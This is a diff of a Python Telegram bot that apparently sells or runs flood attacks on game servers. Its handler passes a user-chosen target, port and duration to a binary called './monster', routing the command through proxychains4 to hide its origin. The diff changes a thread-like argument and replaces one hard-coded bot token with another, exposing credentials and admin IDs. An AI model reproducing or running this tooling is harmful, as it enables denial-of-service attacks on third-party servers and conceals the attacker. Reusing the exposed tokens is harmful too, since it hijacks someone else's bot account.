@@ -6,7 +6,7 @@ import os
 import random
 
 # Put Your Telegram Bot Token Here
-bot = telebot.TeleBot('8083127402:AAF6v-M5lRSE0txIFVRx-KVCkEtzZOqhcFo')
+bot = telebot.TeleBot('7684171167:AAFxCVcNwfmqCkQ_j1pOHdxZDRyKK4UPSJs')
 
 # Admin User ID
 admin_id = ["5406953620", "7353797869"]
@@ -340,7 +340,7 @@ def handle_bgmi(message):
                 # Use a proxy if available
                 proxy = get_random_proxy()
                 if proxy:
-                    full_command = f"proxychains4 -q ./monster {target} {port} {time} 800"
+                    full_command = f"proxychains4 -q ./monster {target} {port} {time} 200"
                     os.environ['PROXYCHAINS_PROXY'] = proxy
                 else:
                     full_command = f"./monster {target} {port} {time} 800"
